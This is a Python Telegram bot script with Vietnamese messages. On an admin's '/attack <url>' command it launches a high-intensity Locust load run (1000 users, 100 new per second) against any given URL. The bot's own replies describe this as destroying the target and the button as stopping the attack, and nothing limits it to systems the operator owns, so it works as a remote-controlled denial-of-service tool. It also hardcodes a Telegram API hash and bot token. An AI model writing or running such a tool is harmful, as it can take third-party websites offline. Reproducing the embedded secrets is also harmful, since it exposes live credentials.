import subprocess
import os
import signal
import threading
import http.server
import socketserver
from telethon import TelegramClient, events, Button

# --- Web Server giả lập để duy trì trạng thái LIVE trên Render ---
def start_web_server():
    PORT = int(os.getenv("PORT", 10000))
    Handler = http.server.SimpleHTTPRequestHandler
    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print(f"Web Server đang chạy trên Port {PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"Web Server Error: {e}")

threading.Thread(target=start_web_server, daemon=True).start()

# --- THÔNG TIN CẤU HÌNH GẮN TRỰC TIẾP ---
API_ID = 36437338
API_HASH = "18d34c7efc396d277f3db62baa078efc"
BOT_TOKEN = "8575442769:AAFjKX3fSXzHW9oYllRRbFeR2KxVe_czfq8"
ADMIN_ID = 7816353760

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
current_process = None

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id != ADMIN_ID: return
    await event.reply("✅ **Hệ thống Stress Test tối thượng đã Online!**\nDùng lệnh: `/attack <url>`")

@bot.on(events.NewMessage(pattern=r'/attack (https?://\S+)'))
async def attack_handler(event):
    global current_process
    if event.sender_id != ADMIN_ID: return
    
    url = event.pattern_match.group(1)
    if current_process and current_process.poll() is None:
        return await event.reply("⚠️ Đang có một bài test chạy rồi. Hãy dừng lại trước!")

    await event.reply(f"🔥 **Đang hủy diệt mục tiêu:** `{url}`\n👥 Users: 1000 | Rate: 100/s", 
                     buttons=[Button.inline("🛑 DỪNG TẤN CÔNG", b"stop")])

    # Chạy Locust với cường độ cao (1000 users, 100 user mới mỗi giây)
    current_process = subprocess.Popen([
        "locust", "-f", "load_test.py", "--headless",
        "-u", "1000", "-r", "100", "--host", url
    ])

@bot.on(events.CallbackQuery(data=b"stop"))
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    global current_process
    if current_process:
        os.kill(current_process.pid, signal.SIGTERM)
        current_process = None
        msg = "🛑 **Đã dừng bài test.**"
    else:
        msg = "Không có tiến trình nào đang chạy."
    
    if isinstance(event, events.CallbackQuery.Event):
        await event.edit(msg)
    else:
        await event.reply(msg)

print("Bot is starting...")
bot.run_until_disconnected()
